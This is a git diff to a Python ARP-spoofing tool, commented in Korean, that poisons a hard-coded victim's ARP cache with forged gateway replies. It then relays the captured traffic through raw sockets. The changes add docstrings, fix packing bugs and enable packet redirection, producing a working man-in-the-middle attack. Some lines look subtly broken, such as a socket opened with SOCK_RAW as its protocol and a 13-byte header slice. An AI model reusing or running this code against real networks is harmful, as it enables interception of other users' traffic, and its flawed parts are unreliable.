@@ -19,10 +19,20 @@ from packet_header_define import *
 class ARP:
     @staticmethod
     def get_headers(packet):
+        """
+        패킷에서 ethernet 헤더와 IP+ARP 부분 헤더를 파싱해 반환
+        :param packet: Raw-packet bytes
+        :return: ethernet header, arp+ip header
+        """
         return unpack("!6s6s2s", packet[0][0:14]), unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])
 
     @staticmethod
     def analysis_header(header):
+        """
+        Hex 형태의 헤더를 필요한 정보만 파싱하여 Dict 로 반환
+        :param header: unhexlify header info
+        :return: Header info dict
+        """
         # if ethernet header
         if len(header) == 3:
             return {
@@ -41,6 +51,11 @@ class ARP:
 
     @staticmethod
     def pretty_mac(mac):
+        """
+        Hex 상태의 맥주소를 읽기 편한 형태의 문자열로 바꿔주는 함수
+        :param mac: unhexlify mac address
+        :return: pretty str-ed mac address Ex) 11:22:33:44:55:66
+        """
         unpacked = hexlify(mac).decode('utf-8')
         return ":".join([i + j for i, j in zip(unpacked[::2], unpacked[1::2])])
 
@@ -48,6 +63,7 @@ class ARP:
         self.victim_ip = victim
         self.gateway_ip = self._get_gateway_ip()
         self.name, self.ip, self.mac = self._get_my_interface_info()
+        self.target_arp_refresh_interval = self.calc_arp_refresh()
         self.victim_mac = self._get_mac(self.victim_ip)
         print("Get Victim's MAC address")
         self.gateway_mac = self._get_mac(self.gateway_ip)
@@ -69,6 +85,10 @@ class ARP:
 
     @staticmethod
     def _get_gateway_ip():
+        """
+        route -n 명령어에서 Gateway 아이피를 파싱 후 반환
+        :return: Gateway IP addr
+        """
         output = popen("""route -n | grep 'UG[ \t]' | awk '{print $2}'""").read()
         return output.split()[0]
 
@@ -133,12 +153,12 @@ class ARP:
 
         # REQUEST packet
         if send_type == ARP_REQUEST_OP:
-            print("Request~")
+            print("Send ARP Request packet")
             packed_sender_mac = self.mac
             packed_sender_ip = self._packing_ip(self.ip)
 
         else:
-            print("Reply~")
+            print("Send ARP Reply packet")
             packed_sender_ip = self._packing_ip(self.gateway_ip)
 
             # My Spoofing Trick~
@@ -177,11 +197,10 @@ class ARP:
             # Done!
         ]
 
-        print("Send packet")
-
         # GOGOGO!
         # Just byte code
         s.send(b''.join(packet_frame))
+        s.close()
 
     def _get_mac(self, target_ip):
         """
@@ -216,23 +235,40 @@ class Relay:
         self.mac = hexlify(arp.mac)
         self.gateway_ip = arp.gateway_ip
         self.gateway_mac = arp.gateway_mac
+        self.name = arp.name
 
     # Semi-Class Method
     def run(self):
+        """
+        멀티 프로세스 환경으로 동작
+        :return: None (Demon)
+        """
         p = Process(target=self.relay, args=())
         p.start()
 
     def edit_packet(self, packet):
+        """
+        패킷 정보의 스푸핑된 정보를 올바른 패킷으로 변환
+        :param packet: Raw-packet bytes
+        :return: Edited Raw-packet bytes
+        """
         arp_partition = unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])
-        edited_arp_partition = arp_partition[:6] + (self.gateway_mac, ) + arp_partition[8:]
+        edited_arp_partition = arp_partition[:6] + (self.gateway_mac,) + arp_partition[7:]
         # pack 양식 찾아보기
         # 아래 코드에서 오류남
-        packed_edited_arp_partition = pack("2s2s1s1s2s6s4s6s4s", edited_arp_partition)
-        return [packet[0][:13] + packed_edited_arp_partition + packet[0][42:]] + packet[1:]
+        packed_edited_arp_partition = pack("2s2s1s1s2s6s4s6s4s", *edited_arp_partition)
+
+        # packet[1] 은 Interface info 므로 Send packet 에서 DROP
+        return packet[0][:13] + packed_edited_arp_partition + packet[0][42:]
 
     def relay(self):
-        rs = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
-
+        """
+        Redirect packet
+        :return: None (Demon)
+        """
+        rs = socket(AF_PACKET, SOCK_RAW, htons(0x0003))  # receive_socket
+        ss = socket(AF_PACKET, SOCK_RAW, SOCK_RAW)  # send socket
+        ss.bind((self.name, SOCK_RAW))
         while True:
             packet = rs.recvfrom(4096)
             eh_hex, ah_hex = ARP.get_headers(packet)
@@ -240,22 +276,32 @@ class Relay:
             # analyzed ip info
             ip_header = ARP.analysis_header(ah_hex)
 
+            # 내가 날리는 ARP 패킷이면 SKIP
+            if ah_hex[5] == ARP_TYPE_ETHERNET_PROTOCOL:
+                continue
+
             # 만약 dst_ip 가 Gateway ip 이면서
             # dst_mac 이 공격자 MAC 일 경우
             # ---> 오염된 피해자의 패킷일 경우
-            #if ip_header['dst_ip'] == self.gateway_ip and ip_header['dst_mac'] == self.mac:
-            if ip_header['src_ip'] == self.victim_ip:
+            if ip_header['dst_ip'] == self.gateway_ip and ip_header['dst_mac'] == self.mac:
                 edited_packet = self.edit_packet(packet)
-            else:
-                print("------------------------------------")
-                print("packet mac: %s\nSource IP: %s" % (ip_header['dst_mac'], ip_header['src_ip']))
-                print("------------------------------------")
-                continue
+                ss.send(edited_packet)  # Redirect!
+
+        """
+            print("Packet:\nSource ip: %s\nSource mac: %s\nDest ip: %s\nDest mac: %s"
+                  % (
+                      ip_header['src_ip'],
+                      ip_header['src_mac'],
+                      ip_header['dst_ip'],
+                      ip_header['dst_mac'])
+                  )
+            print("------------------------------------")
+        """
 
 
 def main():
     # victim_ip = input("Victim IP: ")
-    victim_ip = '192.168.1.82'
+    victim_ip = '192.168.0.42'
     arp = ARP(victim_ip)
 
     r = Relay(arp)
